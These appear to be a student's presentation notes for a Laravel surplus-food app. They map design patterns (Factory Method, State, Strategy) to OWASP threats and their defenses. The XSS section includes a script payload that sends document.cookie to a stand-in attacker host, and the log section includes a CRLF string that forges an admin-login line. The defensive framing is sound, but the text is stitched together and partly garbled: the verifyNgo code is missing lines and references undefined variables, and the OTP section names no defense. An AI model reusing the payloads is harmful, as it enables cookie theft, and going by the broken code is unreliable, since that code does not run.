NOT BASIC INPUT VALIDATION

Threat 1: Cross-Site Request Forgery (CSRF — OWASP A05)

The Attack: A hacker creates an external website with a hidden form pointing to http://127.0.0.1:8000/donations. If a logged-in donor visits that page, their browser automatically sends our session cookie and silently creates spam food listings.
Why validation fails: Form validation only checks if title and quantity are strings or numbers. Since the hacker's hidden form sends valid text, validation passes 100%! It cannot verify where the request originated.
NutriShare Defense: Synchronizer Token Pattern (resources/views/donations/create.blade.php Line 18). We put @csrf inside the form. Laravel creates a secret random 256-bit token tied to the user's session. Laravel's VerifyCsrfToken middleware rejects any request without this token with HTTP 419 Page Expired.

<form method="POST" action="{{ route('donations.store') }}">
    @csrf <!-- Point at Line 18: Generates secret random session token -->
    <input type="text" name="title" required>
</form>

Threat 2: Stored Cross-Site Scripting (Stored XSS — OWASP A07)

The Attack: An attacker types <script>fetch('http://hacker.com?c='+document.cookie)</script> into the food description. When admins or NGOs view the food list, that script executes and steals their cookies.
Why validation fails: We cannot simply reject all < or > characters because legitimate donors write normal text like <Fresh Bread> or Quantity < 50. Validation should not corrupt valid data.
NutriShare Defense: Context-Aware HTML Escaping (resources/views/donations/show.blade.php Line 51). We render using Blade's {{ $donation->description }}. Laravel automatically runs htmlspecialchars(..., ENT_QUOTES, 'UTF-8'), turning <script> into safe &lt;script&gt; so the browser prints it as plain text.

// app/Http/Controllers/Api/DonationApiController.php (Lines 43-80)
public function active(Request $request): JsonResponse {
    try {
        $ifa = SecurityHelper::validateIfaRequest($request->all());
        $donations = Donation::with(['donor:id,name,organization_name', 'foodItems'])
            ->active()
            ->orderBy('created_at', 'desc')
            ->get();

        return response()->json(SecurityHelper::ifaResponse('S', [
            'requestID' => $ifa['requestID'],
            'donations' => $donations,
            'total'     => $donations->count(),
        ]), 200);
    } catch (\Exception $e) {
        return response()->json(SecurityHelper::ifaResponse('E', null, 'Failed to fetch.'), 500);
    }
}

// app/Http/Controllers/Api/DonationApiController.php (Lines 98-115)
public function verifyNgoBeforeClaim(int $ngoUserId): bool {
    try {
        $response = Http::timeout(5)->post(config('app.url').'/api/user/verify-ngo', [
            'requestID' => uniqid('VERIFY-'),
            'timestamp' => now()->toIso8601String(),
            'user_id'   => $ngoUserId,
        ]);

        if ($response->successful() && $response->json('status') === 'S') {
            return (bool) ($response->json('data.is_verified') ?? false);
        }
        return false; // Fail-closed on error
    } catch (\Exception $e) {
        return false; // Fail-closed: block food claim if verification is unreachable
    }
}

🎯 Design Pattern: Factory Method Pattern (GoF Creational)
🗣️ Look Tutor in the Eye & Say:
"The Factory Method Pattern defines an interface or abstract class for creating an object, but lets subclasses decide which exact class to instantiate."

Why we use it in Module 2: NutriShare has 4 user types (Donor, NGO, Admin, Moderator) with completely different creation rules. NGOs require license upload records and pending status; Admins require audit logging; Donors require location tracking. Hardcoding all this into AuthController@register creates a brittle 500-line God method. Factory Method delegates object creation to clean subclasses (NgoCreator, DonorCreator, AdminCreator). 

// app/Services/UserFactory/UserCreator.php (Lines 38-50)
abstract class UserCreator {
    abstract public function createUser(array $data): User;

    public static function resolve(string $role): UserCreator {
        return match ($role) {
            'ngo'       => new NgoCreator(),
            'donor'     => new DonorCreator(),
            'admin'     => new AdminCreator(),
            'moderator' => new ModeratorCreator(),
            default     => throw new InvalidArgumentException("Unknown role: {$role}"),
        };
    }
}

Threat 2: OTP Brute-Force & Credential Stuffing (OWASP A07)

The Attack: A bot uses automated scripts to cycle through all 1,000,000 combinations of 6-digit OTP codes in seconds to hijack an NGO verification account.
Why validation fails: An OTP input validation rule 'otp' => 'required|digits:6' gladly accepts all brute-force attempts because every 6-digit number is technically valid!

public function verifyNgo(Request $request): JsonResponse {
    $ifa = SecurityHelper::validateIfaRequest($request->all());
    $user = User::find($request->input('user_id'));

    $isVerified = $user && $user->role === 'ngo' && $user->verification_status === 'approved';

        ->where('status', 'approved')->exists();

        'requestID'           => $ifa['requestID'],
        'is_verified'         => $isVerified && $hasValidLicense,
        'verification_status' => $user?->verification_status,
        'trust_rating'        => $user?->averageRating(),
    ]), 200);
}

❓ Top 4 Tough Questions & Answers:
Q1: What is the difference between Simple Factory and Factory Method?
Answer: "Simple Factory uses a single class with a switch/case statement to create objects. Factory Method is a full GoF pattern where creation is delegated to subclasses (like NgoCreator), adhering to the Open/Closed Principle so we can add new roles without editing existing code."
Q2: Why not store roles as a boolean like `is_admin` in the users table?
Answer: "A boolean only supports two states. NutriShare requires 4 distinct roles (Donor, NGO, Moderator, Admin) with mutually exclusive permissions and distinct workflows. Using an ENUM role with RBAC middleware provides scalability."
Q3: How do you prevent an attacker from spamming SMS OTPs and causing high financial costs?
Answer: "We implement IP-based and user-based throttling on the OTP generation endpoint: a maximum of 3 OTP requests per 10 minutes, plus a cooldown timer of 60 seconds before an OTP can be resent."
Q4: Why does verifyNgo fail closed if the database or server has an issue?
Answer: "Failing closed means if any error occurs, is_verified defaults to false. In surplus food distribution, food safety is paramount. We must NEVER allow an unverified entity to collect food due to a network glitch."

🎯 Design Pattern: State Pattern (GoF Behavioural)
🗣️ Look Tutor in the Eye & Say:
"The State Pattern allows an object to alter its behavior when its internal state changes. The object will appear to change its class."

Why we use it in Module 3: Food logistics claims have strict linear lifecycles (Pending -> Approved -> Collected -> Distributed). In traditional code, controllers have nested if ($status == 'pending') ... else if ($status == 'collected') conditions that break easily when requirements change. With the State Pattern, transitions are encapsulated into independent classes (PendingState, ApprovedState, CollectedState). 

// app/Models/Claim.php (Lines 93-98)
public function getStateObject(): ClaimState {
    return match ($this->status) {
        'pending'   => new PendingState($this),
        'approved'  => new ApprovedState($this),
        'collected' => new CollectedState($this),
        default     => throw new InvalidStateException("Unknown state: {$this->status}"),
    };
}

Threat 2: State Machine Tampering & Race Conditions (OWASP A04)

The Attack: A malicious user sends a forged POST request to bypass inspection stages, directly changing a claim from 'Pending' to 'Collected' without donor consent.
Why validation fails: If status validation allows 'in:pending,approved,collected,distributed', the string 'collected' is valid syntax! Validation does not enforce chronological state transition rules.

❓ Top 4 Tough Questions & Answers:
Q1: How does the State Pattern differ from the Strategy Pattern?
Answer: "In Strategy Pattern, the client chooses which interchangeable algorithm to run (e.g. Email vs SMS), and strategies typically don't know about each other. In State Pattern, states transition automatically between one another based on lifecycle events, altering the object's behavior internally."
Q2: What happens if two NGOs click 'Claim' on the exact same food at the exact same millisecond?
Answer: "We use database pessimistic locking (Donation::where('id', $id)->lockForUpdate()->first()). The first transaction claims the food and marks it 'claimed'. The second transaction receives an error message stating the item is no longer available."
Q3: Why can't a donor view another donor's claim receipts?
Answer: "Because our ClaimPolicy checks both the claim owner (the NGO) and the underlying donation owner (the Donor). If $user->id !== $donation->user_id, Laravel returns HTTP 403 Forbidden."
Q4: Why does Module 3 require food safety verification before pickup?
Answer: "Surplus food is perishable. A donation may have been safe when published 48 hours ago, but could have expired while awaiting collection. Calling Module 4's safety check guarantees compliance with Malaysian food donor protection acts."

🎯 Design Pattern: Strategy Pattern (GoF Behavioural)
🗣️ Look Tutor in the Eye & Say:
"The Strategy Pattern defines a family of algorithms, encapsulates each one, and makes them interchangeable. Strategy lets the algorithm vary independently from clients that use it."

Why we use it in Module 4: Warehouse alerts must reach managers via multiple channels (Email for detailed logs, SMS for urgent temperature spikes). Without Strategy Pattern, the controller is polluted with multiple 3rd-party vendor SDKs. With Strategy, NotificationDispatcher executes $strategy->send() cleanly, allowing new dispatch channels (e.g. WhatsApp) to be added without modifying existing warehouse logic. 

// app/Strategies/Notification/NotificationDispatcher.php (Lines 35-48)
class NotificationDispatcher {
    public function dispatch(User $user, string $message): bool {
        $strategy = match ($user->notification_preference) {
            'sms'   => new SmsNotificationStrategy(),
            default => new EmailNotificationStrategy(),
        };

        return $strategy->send($user, $message);
    }
}

Threat 1: Log Injection / CRLF Injection (OWASP A09)

The Attack: An attacker names a food item Apples\r\n[2024-09-13 12:00:00] ADMIN_LOGIN_SUCCESS: root. This injects fake log lines into audit files to mask unauthorized activities.
Why validation fails: Standard string validation permits newlines in descriptions and remarks. Validation does not distinguish between user content and log formatting syntax.
NutriShare Defense: Model Mutator Sanitization (app/Models/SystemLog.php Lines 30–42). An Eloquent mutator automatically applies preg_replace('/[\r\n]+/', ' ', $value), flattening multi-line payloads into safe single-line strings. 

// app/Models/SystemLog.php (Lines 32-38)
public function setDescriptionAttribute(string $value): void {
    // Strips CRLF characters to prevent Log Injection
    $this->attributes['description'] = preg_replace('/[\r\n]+/', ' ', $value);
}
NOT BASIC INPUT VALIDATION

Threat 2: Parameter Tampering & Unauthorized Export (OWASP A01/A04)

The Attack: A user receives a link to export their own warehouse log /inventory/export?facility_id=2, and tampers with the query parameter to facility_id=1 to download confidential inventory records.
Why validation fails: facility_id=1 is a valid integer that exists in the database! Validation cannot verify if the user is authorized to tamper with URL query parameters.
NutriShare Defense: Cryptographic HMAC Signed URLs (URL::signedRoute). The URL includes a cryptographic hash &signature=... calculated using the application's secret key. Tampering with any parameter invalidates the hash, resulting in HTTP 403 Invalid Signature. 

// Generating HMAC Signed URL
URL::temporarySignedRoute('inventory.export', now()->addMinutes(30), ['id' => 2]);

// app/Http/Controllers/Api/InventoryApiController.php (Lines 80-110)
public function checkSafety(Request $request): JsonResponse {
    $ifa = SecurityHelper::validateIfaRequest($request->all());
    $item = FoodItem::with('allergenTags')->find($request->input('food_item_id'));

    $isExpired = $item->expiry_date ? $item->expiry_date->isPast() : false;
    $isSafe = !$isExpired;

    return response()->json(SecurityHelper::ifaResponse('S', [
        'requestID'     => $ifa['requestID'],
        'is_safe'       => $isSafe,
        'safety_status' => $isSafe ? 'SAFE' : 'EXPIRED',
        'allergens'     => $item->allergenTags->pluck('name'),
        'days_left'     => $item->expiry_date ? now()->diffInDays($item->expiry_date, false) : null,
    ]), 200);
}

❓ Top 4 Tough Questions & Answers:
Q1: How do you know whether to use Strategy Pattern or State Pattern?
Answer: "Use Strategy when you have different ways of accomplishing the same task (e.g. sending via Email vs SMS) chosen by the user or configuration. Use State when an object's behavior changes based on its lifecycle status (e.g. Pending -> Approved -> Collected) and transitions between them."
Q2: Why is CRLF Log Injection dangerous in an integrative system?
Answer: "In integrative enterprise systems, log files are consumed by automated SIEM tools (like Splunk or Elasticsearch). Injected fake log lines can deceive automated auditing monitors or forge fraudulent audit clearances."
Q3: How does HMAC Signed URLs stop replay attacks?
Answer: "Signed URLs use temporarySignedRoute, which includes an expiration timestamp (expires=...) inside the signed payload. After 30 minutes, even if the URL and signature are intact, Laravel rejects it with HTTP 403 Expired."
Q4: What happens if an external warehouse API goes down?
Answer: "Our HTTP client uses a strict 5-second timeout and catches ConnectionException. The system fails closed and records a warning log, falling back to local cached facility telemetry rather than crashing."
